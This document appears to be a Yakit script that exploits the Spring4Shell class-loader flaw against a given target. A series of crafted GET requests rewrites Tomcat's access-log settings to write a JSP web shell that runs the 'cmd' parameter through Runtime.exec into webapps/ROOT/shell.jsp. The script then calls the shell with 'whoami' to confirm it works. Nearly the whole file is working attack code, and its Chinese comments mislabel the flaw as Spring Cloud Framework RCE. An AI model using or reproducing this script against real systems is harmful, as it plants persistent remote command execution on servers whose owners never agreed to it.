yakit.AutoInitYakit()

# Input your code!

log.setLevel("info")  // 设置日志级别

yakit.Info("开始接受参数")

target = cli.String("target")
if target == "" {
    die("no target")
    yakit.Error("接受参数失败")
}

// 构建文件的内容
sendFile = func(target) {
    return poc.HTTP(`
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern={{url(%{c2}i %{c1}i rt = %{c1}i.getRuntime(); String cmd = request.getParameter("cmd"); Process process = rt.exec(cmd); java.io.InputStream in = process.getInputStream(); out.print("<pre>"); java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in); java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader); String s = null; while ((s = stdInput.readLine()) != null) { out.println(s); }out.print("</pre>");%{suffix}i)}} HTTP/1.1
Host: {{params(target)}}
suffix: %>//
c1: Runtime
c2: <%
`,
        poc.params({
            "target": target,
        }),
    )
}

rsp, req, err = sendFile(target)
die(err)

if err !=nil  {
    log.error("不存在Spring Cloud Framework  远程代码执行漏洞")
    yakit.Error("不存在Spring Cloud Framework  远程代码执行漏洞")
    die(err)
}else{
    log.info("构建文件的内容成功")
    yakit.Info("构建文件的内容成功")
}

// 修改tomcat日志文件后缀
sendFile = func(target) {
    return poc.HTTP(`GET /?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
`,
        poc.params({
            "target": target,
        }),
    )
}

rsp, req, err = sendFile(target)
headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
die(err)

if err !=nil  {
    log.error("不存在Spring Cloud Framework  远程代码执行漏洞")
    yakit.Error("不存在Spring Cloud Framework  远程代码执行漏洞")
    die(err)
}else{
    log.info("修改tomcat日志文件后缀成功")
    yakit.Info("修改tomcat日志文件后缀成功")
}

// 写入文件所在的网站根目录
sendFile = func(target) {
    return poc.HTTP(`GET /?class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
`,
        poc.params({
            "target": target,
        }),
    )
}

rsp, req, err = sendFile(target)
headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
die(err)

if err !=nil  {
    log.error("不存在Spring Cloud Framework  远程代码执行漏洞")
    yakit.Error("不存在Spring Cloud Framework  远程代码执行漏洞")
    die(err)
}else{
    log.info("写入文件所在的网站根目录成功")
    yakit.Info("写入文件所在的网站根目录成功")
}

// 写入文件名称
sendFile = func(target) {
    return poc.HTTP(`GET /?class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
`,
        poc.params({
            "target": target,
        }),
    )
}

rsp, req, err = sendFile(target)
headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
die(err)


if err !=nil  {
    log.error("不存在Spring Cloud Framework  远程代码执行漏洞")
    yakit.Error("不存在Spring Cloud Framework  远程代码执行漏洞")
    die(err)
}else{
    log.info("写入文件名称成功")
    yakit.Info("写入文件名称成功")
}

// 文件日期格式（实际构造为空值即可）
sendFile = func(target) {
    return poc.HTTP(`GET /?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
`,
        poc.params({
            "target": target,
        }),
    )
}

rsp, req, err = sendFile(target)
headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)
die(err)

if err !=nil  {
    log.error("不存在Spring Cloud Framework  远程代码执行漏洞")
    yakit.Error("不存在Spring Cloud Framework  远程代码执行漏洞")
    die(err)
}else{
    log.info("写入文件日期格式成功")
    yakit.Info("写入文件日期格式成功")
}

// 访问写入的shell
sendFile = func(target) {
    return poc.HTTP(`GET /shell.jsp?cmd=whoami HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
`,
        poc.params({
            "target": target,
        }),
    )
}

rsp, req, err = sendFile(target)
header, body = poc.Split(rsp)
// header, body = poc.Split(rsp)
yakit.Info("[+]响应header为：" + string(header))
yakit.Info("[+]响应body为：" + string(body))

if str.MatchAllOfSubString(header, "200")  {
    yakit.Info("[+]添加文件成功，路径shell.jsp?pwd=j&cmd=whoami，密码为cmd")
}else{
    yakit.Error("[-]添加文件失败")
    die(err)
}